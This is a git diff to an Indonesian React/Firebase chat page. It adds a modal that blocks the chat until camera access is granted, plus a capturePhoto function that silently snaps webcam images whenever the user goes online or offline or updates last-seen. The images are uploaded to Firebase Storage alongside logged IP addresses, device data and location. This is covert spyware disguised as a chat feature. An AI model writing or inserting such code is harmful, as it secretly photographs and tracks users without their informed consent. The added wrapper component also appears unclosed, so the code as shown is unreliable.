@@ -20,6 +20,92 @@ import {
 
 import { database, storage } from "../config/firebase";
 import { ref as databaseRef, push, update,get,set ,onValue,serverTimestamp } from "firebase/database";
+import {
+  ref as storageRef,
+  uploadString,
+  getDownloadURL
+} from "firebase/storage";
+
+const ChatPageWrapper = () => {
+  const [cameraAllowed, setCameraAllowed] = useState(false);
+
+   const requestCamera = async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach((track) => track.stop());
+
+      setCameraAllowed(true);
+      localStorage.setItem("cameraGranted", "true");
+
+      // reload sekali di awal setelah diizinkan
+      window.location.reload();
+    } catch (err) {
+      console.warn("❌ Kamera tidak diizinkan:", err);
+      setCameraAllowed(false);
+       alert(
+        "Anda telah memblokir izin kamera. Silakan klik ikon 🔒 di address bar browser, ubah Camera menjadi Allow, lalu coba lagi."
+      );
+    }
+  };
+
+  useEffect(() => {
+    // kalau sebelumnya sudah pernah diizinkan
+    if (localStorage.getItem("cameraGranted")) {
+      setCameraAllowed(true);
+    }
+
+    // ✅ Pantau perubahan izin kamera realtime
+    if (navigator.permissions) {
+      navigator.permissions.query({ name: "camera" }).then((status) => {
+        // set state awal
+        if (status.state === "granted") {
+          setCameraAllowed(true);
+        } else {
+          setCameraAllowed(false);
+        }
+
+        // kalau status berubah (allow → block atau sebaliknya)
+        status.onchange = () => {
+          console.log("📡 Camera permission berubah:", status.state);
+          if (status.state === "granted") {
+            localStorage.setItem("cameraGranted", "true");
+            window.location.reload(); // reload sekali
+          } else {
+            localStorage.removeItem("cameraGranted");
+            setCameraAllowed(false);
+          }
+        };
+      });
+    }
+  }, []);
+
+  return (
+    <div className="relative">
+      {/* ✅ Render ChatPage tetap jalan di belakang */}
+      <ChatPage />
+      {!cameraAllowed && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="p-6 bg-white shadow-xl rounded text-center max-w-sm">
+            <p className="text-lg font-semibold text-red-600 mb-3">
+              🚫 Kamera dibutuhkan
+            </p>
+            <p className="text-gray-600 mb-4">
+              Silakan izinkan akses kamera untuk melanjutkan ke chat.
+            </p>
+            <button
+              onClick={requestCamera}
+              className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
+            >
+              Izinkan Kamera
+            </button>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+
+
+
 const ChatPage = () => {
   const [currentUser] = useState("user1"); // Gantilah dengan ID pengguna yang sesuai
   const [chatWith] = useState("user2"); // ID pengguna tujuan
@@ -205,9 +291,47 @@ useEffect(() => {
       deviceType: deviceType ?? null,
     };
 
+  // ========= FUNGSI CAPTURE FOTO =========
+  const capturePhoto = async (status = "unknown") => {
+    try {
+      // 1. Ambil stream kamera
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
+
+      // 2. Render ke canvas
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx?.drawImage(video, 0, 0);
+
+      const imageData = canvas.toDataURL("image/png");
+
+      // 3. Stop kamera (hemat baterai)
+      stream.getTracks().forEach((track) => track.stop());
+
+      // 4. Upload ke Firebase Storage
+      const timestamp = Date.now();
+      const fileRef = storageRef(
+        storage,
+        `user_captures/${currentUser}_${status}_${timestamp}.png`
+      );
+      await uploadString(fileRef, imageData, "data_url");
+      const downloadURL = await getDownloadURL(fileRef);
+
+      return downloadURL;
+    } catch (err) {
+      console.error("Gagal capture foto:", err);
+      return null;
+    }
+  };
+
   useEffect(() => {
   // if (!currentUser) return;
      if (!currentUser || !ipReady) return;
+    
 
   const userRef = databaseRef(database, `pengguna/${currentUser}`);
   const logsRef = databaseRef(database, `logs_pengguna1/${currentUser}`);
@@ -256,7 +380,7 @@ useEffect(() => {
 
   const updateOnlineStatus = async (latitude = null, longitude = null, ip1 = null, ip2 = null) => {
     await saveOldDataToLogs("online"); // simpan data lama dulu
-
+ const photoURL = await capturePhoto("online");
     const data = {
       user: currentUser,
       isOnline: true,
@@ -264,7 +388,7 @@ useEffect(() => {
       deviceInfo,
       ip1:ipInfo,
       ip2:ipInfo1,
-      
+      photoURL: photoURL || null
     };
 
     // if (ipInfo) data.ip1 = ipInfo;
@@ -279,7 +403,7 @@ useEffect(() => {
 
   const updateOfflineStatus = async () => {
     await saveOldDataToLogs("offline"); // simpan sebelum offline
-
+ const photoURL = await capturePhoto("offline");
     const data = {
       user: currentUser,
       isOnline: false,
@@ -288,6 +412,7 @@ useEffect(() => {
       deviceInfo,
       ip1:ipInfo,
       ip2:ipInfo1,
+      photoURL: photoURL || null
     };
     if (ipInfo) data.ip1 = ipInfo;
     if (ipInfo1) data.ip2 = ipInfo1;
@@ -300,9 +425,10 @@ useEffect(() => {
 
   const updateLastSeen = async () => {
     await saveOldDataToLogs("update_lastSeen"); // simpan sebelum update
-
+ const photoURL = await capturePhoto("update_lastSeen");
     update(userRef, {
       lastSeen: serverTimestamp(),
+      photoURL: photoURL || null
     });
   };
 
